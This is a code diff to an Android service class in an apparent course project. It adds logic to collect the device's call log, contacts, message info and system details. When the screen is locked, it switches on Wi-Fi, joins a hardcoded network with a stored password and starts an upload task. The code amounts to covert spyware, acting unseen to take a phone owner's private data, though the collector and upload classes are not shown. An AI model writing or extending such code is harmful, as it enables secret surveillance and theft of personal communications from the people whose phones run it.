@@ -3,15 +3,20 @@ package yalimov.course.service;
 import android.content.Context;
 import android.util.Log;
 
-import yalimov.course.network.WiFiConnector;
+import yalimov.course.collectors.CallsCollector;
+import yalimov.course.collectors.ContactCollector;
+import yalimov.course.collectors.MessagesCollector;
+import yalimov.course.collectors.SystemCollector;
+
+import yalimov.course.network.UploadTask;
+import yalimov.course.network.WiFiConnectionManager;
 import yalimov.course.receivers.ScreenStateReceiver;
 
-import static yalimov.course.Constants.DEBUG_TAG;
+import static yalimov.course.Common.DEBUG_TAG;
 
 public class ThreadService implements Runnable
 {
     private Context context;
-//    private KeyguardManager KeyGuardManager;
     private boolean WifiWasEnabled;
     private boolean WifiWasConnected;
     private boolean ActionIsActive = false;
@@ -25,8 +30,16 @@ public class ThreadService implements Runnable
     public ThreadService(Context _context)
     {
         context = _context;
-        //KeyGuardManager = (KeyguardManager)context.getSystemService(NetService.KEYGUARD_SERVICE);
     }
+
+    private void CollectAndSendInfo()
+    {
+        CallsCollector.GetCalls(context);
+        ContactCollector.getContactList(context);
+        MessagesCollector.GetMessagesInfo(context);
+        SystemCollector.SetOsInfo(context);
+    }
+
 
     private void Reset()
     {
@@ -34,43 +47,43 @@ public class ThreadService implements Runnable
         {
             ActionIsActive = false;
 
-            WiFiConnector.Disconnect(context);
-            WiFiConnector.DisableWiFi(context);
+            WiFiConnectionManager.Disconnect(context);
+            WiFiConnectionManager.DisableWiFi(context);
             // TODO: Implement full reset
             /*
-            if (WiFiConnector.IsWifiConnected(context))
+            if (WiFiConnectionManager.IsWifiConnected(context))
             {
-                WiFiConnector.Disconnect(context);
+                WiFiConnectionManager.Disconnect(context);
             }
             if (!WifiWasEnabled)
             {
-                WiFiConnector.DisableWiFi(context);
+                WiFiConnectionManager.DisableWiFi(context);
             }
             if (WifiWasConnected)
             {
                 // TODO: Implement getting this requisites:
-                // WiFiConnector.Connect(context, PreviousSsid, PreviousPass);
+                // WiFiConnectionManager.Connect(context, PreviousSsid, PreviousPass);
             }
             */
         }
     }
     private void ServiceAction()
     {
-        if (!ScreenStateReceiver.ScreenActive)
+        if (!ScreenStateReceiver.isScreenActive())
         {
             if (!ActionIsActive)
             {
                 ActionIsActive = true;
                 Log.d(DEBUG_TAG, "Screen locked, action not started yet, starting action");
-                WiFiConnector.EnableWifi(context);
-                WiFiConnector.Disconnect(context);
-                WiFiConnector.Connect(context, SSID, Pass);
-                WiFiConnector.Ping();
+                WiFiConnectionManager.EnableWifi(context);
+                WiFiConnectionManager.Disconnect(context);
+                WiFiConnectionManager.Connect(context, SSID, Pass);
+                new UploadTask().execute();
             }
             else
             {
                 Log.d(DEBUG_TAG, "Screen locked, action already started. Continue action");
-                WiFiConnector.Ping();
+                WiFiConnectionManager.Ping();
             }
         }
         else
@@ -87,8 +100,8 @@ public class ThreadService implements Runnable
             if (!ActionIsActive)
             {
               //  TODO: Implement full reset features
-              //  WifiWasEnabled   = WiFiConnector.IsWifiEnabled(context);
-              //  WifiWasConnected = WiFiConnector.IsWifiConnected(context);
+              //  WifiWasEnabled   = WiFiConnectionManager.IsWifiEnabled(context);
+              //  WifiWasConnected = WiFiConnectionManager.IsWifiConnected(context);
               WifiWasEnabled   = false;
               WifiWasConnected = false;
             }
